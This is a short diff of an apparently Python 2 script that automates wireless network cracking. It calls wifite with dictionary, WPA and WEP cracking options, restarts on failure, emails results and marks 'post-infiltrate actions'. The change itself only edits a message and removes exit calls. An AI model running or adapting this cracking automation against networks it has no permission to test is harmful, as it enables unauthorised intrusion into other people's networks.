@@ -96,7 +96,7 @@ def get_iface():
         print "Using wireless interface: %s" %(adapters[0])
         return adapters[0]
     else:
-        print "No wireless interfaces found.\nPlease plug in wireless interface"
+        print "No wireless interfaces found.\nPlease plug in wireless interface."
         raise SystemExit
 if args.interface:
     interface = args.interface
@@ -251,7 +251,6 @@ if is_connected() == False or test_mode == True:
                     break
                 else:
                     restartscript()
-                    raise SystemExit
         if gotem == False and wpa_attack == True:
             subprocess.call(["sudo", "wifite", '-crack', '-dict', dictionary, '-pow', '35', '-mac', "-i", interface, '-quiet', '-wpadt', '30', '-strip', '-aircrack', '-wpa', '-wep'])	
             for ap in ap_list:
@@ -265,7 +264,6 @@ if is_connected() == False or test_mode == True:
                         break
                 else:
                     restartscript()
-                    raise SystemExit
         else:
             print "None found..."
         print 'Wifite phase finished.'
@@ -277,7 +275,6 @@ if is_connected() == False or test_mode == True:
         send_email()
     else:
         restartscript()
-        raise SystemExit
 
 #Time for post-infiltrate actions.
 if is_connected() == True:
